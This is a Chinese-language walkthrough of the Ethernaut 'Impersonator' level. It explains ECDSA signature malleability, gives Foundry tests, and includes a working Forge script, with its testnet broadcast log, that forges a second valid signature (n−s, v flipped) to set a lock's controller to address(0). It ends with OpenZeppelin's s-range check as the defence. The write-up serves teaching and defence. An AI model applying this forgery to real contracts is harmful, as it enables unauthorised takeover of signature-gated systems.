# [Ethernaut] 32. 仿冒者（Impersonator）

## **1. 问题**
- https://ethernaut.openzeppelin.com/level/32

SlockDotIt的新产品**ECLocker**将物联网门禁锁与Solidity智能合约相结合，利用以太坊椭圆曲线数字签名算法（ECDSA）进行授权。当向锁发送有效的签名时，系统会触发`Open`事件，为授权的控制器解锁门。SlockDotIt聘请你在该产品发布前评估其安全性。你能否破坏这个系统，让任何人都能打开门？

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "openzeppelin-contracts-08/access/Ownable.sol";

// SlockDotIt ECLocker 工厂合约
contract Impersonator is Ownable {
    uint256 public lockCounter;
    ECLocker[] public lockers;

    event NewLock(address indexed lockAddress, uint256 lockId, uint256 timestamp, bytes signature);

    constructor(uint256 _lockCounter) {
        lockCounter = _lockCounter;
    }

    function deployNewLock(bytes memory signature) public onlyOwner {
        // 部署新的锁合约
        ECLocker newLock = new ECLocker(++lockCounter, signature);
        lockers.push(newLock);
        emit NewLock(address(newLock), lockCounter, block.timestamp, signature);
    }
}

contract ECLocker {
    uint256 public immutable lockId;
    bytes32 public immutable msgHash;
    address public controller;
    mapping(bytes32 => bool) public usedSignatures;

    event LockInitializated(address indexed initialController, uint256 timestamp);
    event Open(address indexed opener, uint256 timestamp);
    event ControllerChanged(address indexed newController, uint256 timestamp);

    error InvalidController();
    error SignatureAlreadyUsed();

    /// @notice 初始化锁合约
    /// @param _lockId SlockDotIt工厂合约设定的唯一锁ID
    /// @param _signature 初始控制器的签名
    constructor(uint256 _lockId, bytes memory _signature) {
        // 设置锁ID
        lockId = _lockId;

        // 计算消息哈希
        bytes32 _msgHash;
        assembly {
            mstore(0x00, "\x19Ethereum Signed Message:\n32") // 28字节
            mstore(0x1C, _lockId) // 32字节
            _msgHash := keccak256(0x00, 0x3c) //28 + 32 = 60字节
        }
        msgHash = _msgHash;

        // 从签名中恢复初始控制器地址
        address initialController = address(1);
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, _msgHash) // 32字节
            mstore(add(ptr, 32), mload(add(_signature, 0x60))) // 32字节的v值
            mstore(add(ptr, 64), mload(add(_signature, 0x20))) // 32字节的r值
            mstore(add(ptr, 96), mload(add(_signature, 0x40))) // 32字节的s值
            pop(
                staticcall(
                    gas(), // 交易剩余的燃气量
                    initialController, // ecrecover函数的地址
                    ptr, // 输入数据的起始位置
                    0x80, // 输入数据的长度
                    0x00, // 输出数据的起始位置
                    0x20 // 输出数据的长度
                )
            )
            if iszero(returndatasize()) {
                mstore(0x00, 0x8baa579f) // 触发InvalidSignature()错误
                revert(0x1c, 0x04)
            }
            initialController := mload(0x00)
            mstore(0x40, add(ptr, 128))
        }

        // 将该签名标记为已使用
        usedSignatures[keccak256(_signature)] = true;

        // 设置控制器
        controller = initialController;

        // 触发LockInitializated事件
        emit LockInitializated(initialController, block.timestamp);
    }

    /// @notice 打开锁
    /// @dev 触发Open事件
    /// @param v 恢复ID
    /// @param r 签名的r值
    /// @param s 签名的s值
    function open(uint8 v, bytes32 r, bytes32 s) external {
        address add = _isValidSignature(v, r, s);
        emit Open(add, block.timestamp);
    }

    /// @notice 更改锁的控制器
    /// @dev 更新controller存储变量
    /// @dev 触发ControllerChanged事件
    /// @param v 恢复ID
    /// @param r 签名的r值
    /// @param s 签名的s值
    /// @param newController 新的控制器地址
    function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external {
        _isValidSignature(v, r, s);
        controller = newController;
        emit ControllerChanged(newController, block.timestamp);
    }

    function _isValidSignature(uint8 v, bytes32 r, bytes32 s) internal returns (address) {
        address _address = ecrecover(msgHash, v, r, s);
        require (_address == controller, InvalidController());

        bytes32 signatureHash = keccak256(abi.encode([uint256(r), uint256(s), uint256(v)]));
        require (!usedSignatures[signatureHash], SignatureAlreadyUsed());

        usedSignatures[signatureHash] = true;

        return _address;
    }
}
```

___

## **2. 问题解决条件确认**

> 破坏系统，使任何人都能触发**ECLocker**的`Open`事件。

要触发ECLocker的`Open`事件，首先需要执行`open`函数，并且传入的参数`(v, r, s)`必须通过`_isValidSignature`函数验证为有效的签名。

```solidity
function open(uint8 v, bytes32 r, bytes32 s) external {
    address add = _isValidSignature(v, r, s);
    emit Open(add, block.timestamp);
}
```

`_isValidSignature`函数首先通过`ecrecover`内置函数验证`(v, r, s)`是否为`msgHash`的有效签名，并获取恢复的签名者地址。然后检查该签名者地址是否与`controller`一致。如果不一致，会抛出`InvalidController`错误。如果一致，则生成该签名的哈希值（`signatureHash`），检查该签名是否已被使用过；若为已使用的签名，会抛出`SignatureAlreadyUsed`错误。未被使用的签名会被存入`usedSignatures`中，最终返回签名者的地址。

```solidity
bytes32 public immutable msgHash;
address public controller;
mapping(bytes32 => bool) public usedSignatures;

function _isValidSignature(uint8 v, bytes32 r, bytes32 s) internal returns (address) {
    address _address = ecrecover(msgHash, v, r, s);
    require(_address == controller, InvalidController());

    bytes32 signatureHash = keccak256(
        abi.encode([uint256(r), uint256(s), uint256(v)])
    );
    require(!usedSignatures[signatureHash], SignatureAlreadyUsed());

    usedSignatures[signatureHash] = true;

    return _address;
}
```

那么，要让「任何人」都能正常执行`open`函数，需要修改哪个部分呢？

我们需要**将`controller`修改为`address(0)`**。原因在于[ecrecover函数](https://www.evm.codes/precompiled?fork=cancun#0x01)的特性。当`ecrecover`无法恢复签名者的地址，或者执行所需的燃气不足时，它不会返回任何数据。但由于函数执行本身并不会发生`revert`（交易执行被撤销），因此会从空的内存中读取返回数据。因此，`_address`中会存储`0x0`，最终`_address`的值为`address(0)`。

![](Ethernaut%2032.%20Impersonator/img.png)

也就是说，将`controller`修改为`address(0)`后，即使`(v, r, s)`签名值无效，任何人都能毫无问题地执行`open`函数！

要将`controller`修改为`address(0)`，需要执行`changeController`函数。此时，也需要签名者是原`controller`，并且使用未被使用过的`(v, r, s)`值通过`_isValidSignature`函数的验证。

```solidity
function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external {
	_isValidSignature(v, r, s);
	controller = newController;
	emit ControllerChanged(newController, block.timestamp);
}
```

整理一下问题解决过程，如下所示：

1.  必须找到针对`msgHash`的有效`(v, r, s)`签名值。此时，签名者必须是`controller`。
2.  调用`changeController`函数，将`controller`修改为`address(0)`。

这样一来，问题就归结为一个点：**不知道`controller`的私钥，如何生成有效的签名呢？**

___

## **3. 签名可变性（Signature Malleability）**

### **ECDSA签名的基本结构**

在以太坊中，ECDSA签名由以下三个组成部分构成：

1.  **r**：从签名生成时使用的椭圆曲线点的x坐标推导而来的值
2.  **s**：基于签名生成过程中使用的随机秘密值和消息哈希计算得出的值
3.  **v**：恢复标识符（Recovery Identifier），是从签名中恢复公钥时使用的附加信息，通常取值为27或28。

### **签名可变性**

以太坊使用的ECDSA签名方式存在一个漏洞：即使不知道私钥，也可以通过略微修改签名数据，在不使原签名失效的前提下生成新的有效签名。

为什么会存在这样的漏洞呢？观察椭圆曲线的形状就能轻松理解。虽然下面的曲线并非直接应用于签名，但只需记住**曲线关于x轴对称**这一点即可。正因为**曲线关于x轴对称**，所以与x对应的y值有两个。因此，在签名`(r, s)`中，将s沿x轴反转后的**(r, -s)也被视为有效的签名**。

![](Ethernaut%2032.%20Impersonator/img.1.png)

y² = x³ + 7

> **预期问题：不对啊，(r, s)并不是椭圆曲线上的点吧？**

没错。(r, s)是标量值而非椭圆曲线上的点，但**椭圆曲线的对称性**仍然有效适用。

### **为何将s值改为-s后签名依然有效？**

在椭圆曲线secp256k1中，签名`(r, s)`满足以下公式：

**s ≡ k⁻¹(z + re) mod n**

其中：

-   k：随机的秘密值
-   z：消息哈希
-   e：签名者的私钥
-   n：由生成点G生成的有限循环群的阶数

如果将s值改为`n - s`，则：

**s′ ≡ n - s ≡ -s mod n**

将其代入上述公式可得：

**s′ ≡ k⁻¹(-z - re) mod n**

也就是说，`n - s`也是可以通过k、z、r、e、n计算得出的有效值。这正是得益于椭圆曲线的对称性。那么，仅仅将s改为`n - s`就能解决问题吗？

### **将s改为n - s的测试**

以下代码使用实际问题中的`msgHash`、`v`、`r`、`s`以及群的阶数`n`计算出`newS(n - s)`，并测试从`(v, r, s)`恢复的签名者地址与从`(v, r, newS)`恢复的签名者地址是否相同。

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";

contract SignatureMalleabilityTest is Test {
    bytes32 msgHash =
        0xf413212ad6f041d7bf56f97eb34b619bf39a937e1c2647ba2d306351c6d34aae;
    bytes32 n =
        0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
    uint8 v = 0x1b; // 27
    bytes32 r =
        0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91;
    bytes32 s =
        0x78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2;

    function setUp() public {}

    function test_SubtractS() public {
        address originalAddr = ecrecover(msgHash, v, r, s);

        bytes32 newS = bytes32(uint256(n) - uint256(s));

        address newAddr = ecrecover(msgHash, v, r, newS);

        assertEq(originalAddr, newAddr);
    }
}
```

运行此测试会出现如下失败结果：从`(v, r, s)`恢复的地址与从`(v, r, newS)`恢复的地址并不相同！到底是哪里出了问题呢？

```shell
forge test --mc SignatureMalleabilityTest -vvvv
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for testsignature.t.sol:SignatureMalleabilityTest
[FAIL: assertion failed: 0x42069d82D9592991704e6E41BF2589a76eAd1A91 != 0x84165C5E6aD5ACa866b74f38fBe93C99AbAB5031] test_SubtractS() (gas: 20767)
Traces:
  [143] SignatureMalleabilityTest::setUp()
    └─ ← [Stop] 

  [20767] SignatureMalleabilityTest::test_SubtractS()
    ├─ [3000] PRECOMPILES::ecrecover(0xf413212ad6f041d7bf56f97eb34b619bf39a937e1c2647ba2d306351c6d34aae, 27, 11397568185806560130291530949248708355673262872727946990834312389557386886033, 54405834204020870944342294544757609285398723182661749830189277079337680158706) [staticcall]
    │   └─ ← [Return] 0x00000000000000000000000042069d82d9592991704e6e41bf2589a76ead1a91
    ├─ [3000] PRECOMPILES::ecrecover(0xf413212ad6f041d7bf56f97eb34b619bf39a937e1c2647ba2d306351c6d34aae, 27, 11397568185806560130291530949248708355673262872727946990834312389557386886033, 61386255033295324479228690463930298567438841096413154552415886062180481335631) [staticcall]
    │   └─ ← [Return] 0x00000000000000000000000084165c5e6ad5aca866b74f38fbe93c99abab5031
    ├─ [0] VM::assertEq(0x42069d82D9592991704e6E41BF2589a76eAd1A91, 0x84165C5E6aD5ACa866b74f38fBe93C99AbAB5031) [staticcall]
    │   └─ ← [Revert] assertion failed: 0x42069d82D9592991704e6E41BF2589a76eAd1A91 != 0x84165C5E6aD5ACa866b74f38fBe93C99AbAB5031
    └─ ← [Revert] assertion failed: 0x42069d82D9592991704e6E41BF2589a76eAd1A91 != 0x84165C5E6aD5ACa866b74f38fBe93C99AbAB5031

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 649.71µs (426.17µs CPU time)

Ran 1 test suite in 120.83ms (649.71µs CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in testsignature.t.sol:SignatureMalleabilityTest
[FAIL: assertion failed: 0x42069d82D9592991704e6E41BF2589a76eAd1A91 != 0x84165C5E6aD5ACa866b74f38fBe93C99AbAB5031] test_SubtractS() (gas: 20767)

Encountered a total of 1 failing tests, 0 tests succeeded
```

### **公钥恢复**

在之前的测试中，使用`newS`恢复地址时得到了完全不同的结果。公钥恢复的公式如下：

**P = r⁻¹ (sR - zG)**

**P′ = r⁻¹ (sR′ - zG)**

其中：

-   r：从签名生成时使用的椭圆曲线点的x坐标推导而来的值
-   s：基于签名生成过程中使用的秘密值和消息哈希计算得出的值
-   R、R′：通过x坐标r在椭圆曲线上获取的两个点。若R是最初得到的(x, y)，则R′为(x, n - y)
-   z：消息哈希
-   G：椭圆曲线生成点

R和R′可通过以下方式计算：

```go
package main

import (
"fmt"
"math/big"
)

var P = big.NewInt(0).Sub(
big.NewInt(0).Sub(
big.NewInt(0).Exp(big.NewInt(2), big.NewInt(256), nil),
big.NewInt(0).Exp(big.NewInt(2), big.NewInt(32), nil)),
big.NewInt(977))

func main() {
r, _ := big.NewInt(0).SetString("1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91", 16)

        // y² = x³ + 7 (mod P)
ySquared := big.NewInt(0).Exp(r, big.NewInt(3), P)
ySquared.Add(ySquared, big.NewInt(7))
ySquared.Mod(ySquared, P)

exponent := new(big.Int).Add(P, big.NewInt(1)) // P + 1
exponent.Div(exponent, big.NewInt(4))          // (P + 1) / 4
y := new(big.Int).Exp(ySquared, exponent, P)   // y = ySquared ^ ((P + 1) / 4) (mod P) -> 计算y值

yAlt := new(big.Int).Sub(P, y) // yAlt = P - y

fmt.Printf("R: (%s, %s)\n", r.Text(16), y.Text(16))
fmt.Printf("R′: (%s, %s)\n", r.Text(16), yAlt.Text(16))
}
```

```shell
$ go run .
R: (1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91, d5b8cb5566ffa2f8934c782cd348548ff11a19d7718b5beff7eb55bb42111ef4)
R′: (1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91, 2a4734aa99005d076cb387d32cb7ab700ee5e6288e74a4100814aa43bdeedd3b)
```

通过各个点推导得出的公钥如下：

-   从R推导的公钥：0x42069d82D9592991704e6E41BF2589a76eAd1A91
-   从R′推导的公钥：0x84165C5E6aD5ACa866b74f38fBe93C99AbAB5031

由x坐标r可推导出椭圆曲线上的两个点R和R′，对应的公钥也有P和P′两个。显然这两个公钥不可能都有效，那么如何判断哪个才是签名者的公钥呢？

### **v值与y坐标的符号**

v值在公钥恢复过程中**用于从签名中识别准确的公钥**。如前所述，这是在公钥恢复的两种可能解中选择正确答案的关键。

v值的基础取值为27或28（EIP-155引入的链ID扩展机制超出本文讨论范围，暂不涉及）：

-   当v=27时：选择y坐标为偶数的点
-   当v=28时：选择y坐标为奇数的点

回到问题本身，已知v值为27，因此通过R（y为偶数的点）推导的公钥`0x42069d82D9592991704e6E41BF2589a76eAd1A91`会被恢复为签名者的公钥。

### **当s改为n - s时，v值该如何调整？**

之前的测试中使用`(v, r, n - s)`恢复出的公钥是`0x84165C5E6aD5ACa866b74f38fBe93C99AbAB5031`，重新分析公式：

**P = r⁻¹ (sR - zG)**

若将s替换为-s，可得：

**r⁻¹ (-sR - zG) = r⁻¹ (sR′ - zG) = P′**

此时R的y符号被反转，最终会使用y为奇数的R′推导公钥。

由于我们需要通过`_isValidSignature`函数验证，必须得到公钥P。因此在使用-s时，需满足：

**r⁻¹ (-sR′ - zG) = r⁻¹ (sR - zG) = P**

即需使用y为奇数的R′，对应的v值应从27调整为28。

### **修改后的测试**

将v值改为28后重新运行测试：

```solidity
function test_SubtractS() public {
    address originalAddr = ecrecover(msgHash, v, r, s);

    uint8 newV = 27 + (1 - (v - 27)); // 切换v值（27↔28）
    bytes32 newS = bytes32(uint256(n) - uint256(s));

    address newAddr = ecrecover(msgHash, newV, r, newS);

    assertEq(originalAddr, newAddr);
}
```

```shell
forge test --mc SignatureMalleabilityTest -vvvv
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for testsignature.t.sol:SignatureMalleabilityTest
[PASS] test_SubtractS() (gas: 21055)
Traces:
  [21055] SignatureMalleabilityTest::test_SubtractS()
    ├─ [3000] PRECOMPILES::ecrecover(0xf413212ad6f041d7bf56f97eb34b619bf39a937e1c2647ba2d306351c6d34aae, 27, 11397568185806560130291530949248708355673262872727946990834312389557386886033, 54405834204020870944342294544757609285398723182661749830189277079337680158706) [staticcall]
    │   └─ ← [Return] 0x00000000000000000000000042069d82d9592991704e6e41bf2589a76ead1a91
    ├─ [3000] PRECOMPILES::ecrecover(0xf413212ad6f041d7bf56f97eb34b619bf39a937e1c2647ba2d306351c6d34aae, 28, 11397568185806560130291530949248708355673262872727946990834312389557386886033, 61386255033295324479228690463930298567438841096413154552415886062180481335631) [staticcall]
    │   └─ ← [Return] 0x00000000000000000000000042069d82d9592991704e6e41bf2589a76ead1a91
    ├─ [0] VM::assertEq(0x42069d82D9592991704e6E41BF2589a76eAd1A91, 0x42069d82D9592991704e6E41BF2589a76eAd1A91) [staticcall]
    │   └─ ← [Return] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 639.04µs (412.42µs CPU time)

Ran 1 test suite in 120.38ms (639.04µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdna%2FNfvo6%2FbtsKTUgFOqY%2FAAAAAAAAAAAAAAAAAAAAAFr07qZ-VIaq7Z2JHflJPGPM22OTpcte85mwmd8ktyj8%2Fimg.png%3Fcredential%3DyqXZFxpELC7KVnFOS48ylbz2pIh7yKj8%26expires%3D1767193199%26allow_ip%3D%26allow_referer%3D%26signature%3DZ3apAOfonsI9K12CpzFs7LO%252Flpg%253D)

测试成功！

## **4. 攻击**

### **编写脚本**

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {Script, console} from "forge-std/Script.sol";
import {Impersonator, ECLocker} from "src/32.Impersonator.sol";

contract ImpersonatorScript is Script {
    // secp256k1椭圆曲线有限循环群的阶数n
    bytes32 N =
        0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    function setUp() public {}

    function run() public {
        // 启动广播模式（用于发送交易）
        vm.startBroadcast();

        // 题目实例合约地址
        address instanceAddr = 0x1a2942bED6e1b02990C01c7c48836bDe94fC5372;

        // 实例化Impersonator工厂合约和第一个ECLocker锁合约
        Impersonator impersonator = Impersonator(instanceAddr);
        ECLocker locker = impersonator.lockers(0);

        // 已知的初始有效签名（v, r, s）
        uint8 v = 0x1b; // 27（十进制）
        bytes32 r = 0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91;
        bytes32 s = 0x78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2;

        // 利用签名可变性生成新的有效签名：切换v值（27↔28），计算newS = n - s
        uint8 newV = 27 + (1 - (v - 27));
        bytes32 newS = bytes32(uint256(N) - uint256(s));

        // 调用changeController，将控制器修改为address(0)
        locker.changeController(newV, r, newS, address(0));

        // 停止广播模式
        vm.stopBroadcast();
    }
}
```

### **执行脚本**

```shell
forge script script/32.Impersonator.s.sol --account dev --sender 0x965B0E63e00E7805569ee3B428Cf96330DFc57EF --rpc-url sepolia --broadcast -vvvv
[⠊] Compiling...
No files changed, compilation skipped
Traces:
  [49730] ImpersonatorScript::run()
    ├─ [0] VM::startBroadcast()
    │   └─ ← [Return] 
    ├─ [4645] 0xC0231b5c1926a3c41AB6e75C131DC39A2858aBbB::lockers(0) [staticcall]
    │   └─ ← [Return] 0x00C51350C2EE06551C46D9993EdF5D80BECFa2D5
    ├─ [33401] 0x00C51350C2EE06551C46D9993EdF5D80BECFa2D5::changeController(28, 0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91, 0x87b7639b5f24e93bf106794133370f950d5e9b00f5b5c8cbd866a487529b814f, 0x0000000000000000000000000000000000000000)
    │   ├─ [3000] PRECOMPILES::ecrecover(0xf413212ad6f041d7bf56f97eb34b619bf39a937e1c2647ba2d306351c6d34aae, 28, 11397568185806560130291530949248708355673262872727946990834312389557386886033, 61386255033295324479228690463930298567438841096413154552415886062180481335631) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000042069d82d9592991704e6e41bf2589a76ead1a91
    │   ├─ emit ControllerChanged(newController: 0x0000000000000000000000000000000000000000, timestamp: 1732360560 [1.732e9])
    │   └─ ← [Stop] 
    ├─ [0] VM::stopBroadcast()
    │   └─ ← [Return] 
    └─ ← [Stop] 


Script ran successfully.

## Setting up 1 EVM.
==========================
Simulated On-chain Traces:

  [33401] 0x00C51350C2EE06551C46D9993EdF5D80BECFa2D5::changeController(28, 0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91, 0x87b7639b5f24e93bf106794133370f950d5e9b00f5b5c8cbd866a487529b814f, 0x0000000000000000000000000000000000000000)
    ├─ [3000] PRECOMPILES::ecrecover(0xf413212ad6f041d7bf56f97eb34b619bf39a937e1c2647ba2d306351c6d34aae, 28, 11397568185806560130291530949248708355673262872727946990834312389557386886033, 61386255033295324479228690463930298567438841096413154552415886062180481335631) [staticcall]
    │   └─ ← [Return] 0x00000000000000000000000042069d82d9592991704e6e41bf2589a76ead1a91
    ├─ emit ControllerChanged(newController: 0x0000000000000000000000000000000000000000, timestamp: 1732360572 [1.732e9])
    └─ ← [Stop] 


==========================

Chain 11155111（Sepolia测试网链ID）

Estimated gas price: 26.229131761 gwei（预估燃气价格）

Estimated total gas used for script: 74506（脚本预估总燃气消耗量）

Estimated amount required: 0.001954227690985066 ETH（预估所需ETH数量）

==========================
Enter keystore password:（输入密钥库密码）

##### sepolia
✅  [Success] Hash: 0xeddbae7a3940d18102ad7efd68dd4b645f391a45d701da42682daf46ca9ad2f2（交易哈希）
Block: 7135779（打包区块号）
Paid: 0.000706945324998745 ETH (50945 gas * 13.876638041 gwei)（实际消耗ETH：燃气量×燃气价格）

✅ Sequence #1 on sepolia | Total Paid: 0.000706945324998745 ETH (50945 gas * avg 13.876638041 gwei)
                                                                                                                                                                                                           

==========================

ONCHAIN EXECUTION COMPLETE & SUCCESSFUL.（链上执行完成且成功）

Transactions saved to: /ethernaut/broadcast/32.Impersonator.s.sol/11155111/run-latest.json（交易记录保存路径）

Sensitive values saved to: /ethernaut/cache/32.Impersonator.s.sol/11155111/run-latest.json（敏感值保存路径）
```

### **提交验证**

![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdna%2FPP77u%2FbtsKTYJOKtW%2FAAAAAAAAAAAAAAAAAAAAAMJbuDmP28j6x7pSecaYgbkA9IuOhNqCxh9exTSIdXT9%2Fimg.png%3Fcredential%3DyqXZFxpELC7KVnFOS48ylbz2pIh7yKj8%26expires%3D1767193199%26allow_ip%3D%26allow_referer%3D%26signature%3Dc6IkPEHF4wDUMErK7Uei3awuIxo%253D)

（注：提交后Ethernaut平台会验证`controller`是否已改为`address(0)`，验证通过则题目完成）

## **5. 防范签名可变性引发的安全问题的方法**

### **使用安全的OpenZeppelin ECDSA库**

这道题的最终意图其实是让开发者“使用我们的库”。

[OpenZeppelin/openzeppelin-contracts：用于安全智能合约开发的库](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/448efeea6640bbbc09373f03fbc9c88e280147ba/contracts/utils/cryptography/ECDSA.sol)

那么，这个库和原生的ecrecover有什么不同呢？来看下面的代码。在代码中，调用`ecrecover`函数之前会对`s`值进行简单的有效性检查。具体检查什么呢？检查`s`值是否大于群的阶数`n`的一半（`n/2`）。如果`s > n/2`，则将其视为无效签名并抛出错误。通过这种方式强制`s`值小于或等于`n/2`，就能防止攻击者利用签名可变性重复使用签名。当然，这会增加一定的燃气成本，但为了安全，这种代价是值得的。

```solidity
function tryRecover(
    bytes32 hash,
    uint8 v,
    bytes32 r,
    bytes32 s
) internal pure returns (address recovered, RecoverError err, bytes32 errArg) {
    // EIP-2仍允许ecrecover()存在签名可变性。需消除这种可能性，使签名唯一。
    // 以太坊黄皮书附录F（https://ethereum.github.io/yellowpaper/paper.pdf）中，
    // 公式(301)定义了s的有效范围：0 < s < secp256k1n ÷ 2 + 1，公式(302)定义了v的范围：v ∈ {27, 28}。
    // 目前大多数库生成的签名都具有唯一的s值，且s值处于阶数的下半区间。
    //
    // 若你的库生成的签名存在可变性（例如s值处于上半区间），可通过计算新的s值：
    // 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 - s1，
    // 并将v值从27改为28（或反之）来修正。若你的库生成的v值为0/1而非27/28，
    // 可给v值加27以兼容这类可变签名。
    if (
        uint256(s) >
        0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0
    ) {
        return (address(0), RecoverError.InvalidSignatureS, s);
    }

    // 若签名有效（且无变性），返回签名者地址
    address signer = ecrecover(hash, v, r, s);
    if (signer == address(0)) {
        return (address(0), RecoverError.InvalidSignature, bytes32(0));
    }

    return (signer, RecoverError.NoError, bytes32(0));
}
```

### 补充说明
OpenZeppelin的ECDSA库通过限制`s`值的范围，从根本上消除了ECDSA签名的可变性问题：
1. **s值的有效范围**：强制`s`值小于`secp256k1`曲线阶数的一半（`n/2`），使得每个合法的签名都只有唯一的`s`值表示形式。
2. **签名唯一性**：避免了攻击者通过将`s`替换为`n-s`、`v`值切换的方式生成新的有效签名，从而杜绝了签名重放攻击的风险。
3. **兼容性处理**：对于部分旧库生成的不符合规范的签名，库中也提供了对应的修正思路，保证了向后兼容性。

这种做法是目前行业内防范ECDSA签名可变性的标准方案，也是开发安全智能合约时的最佳实践。
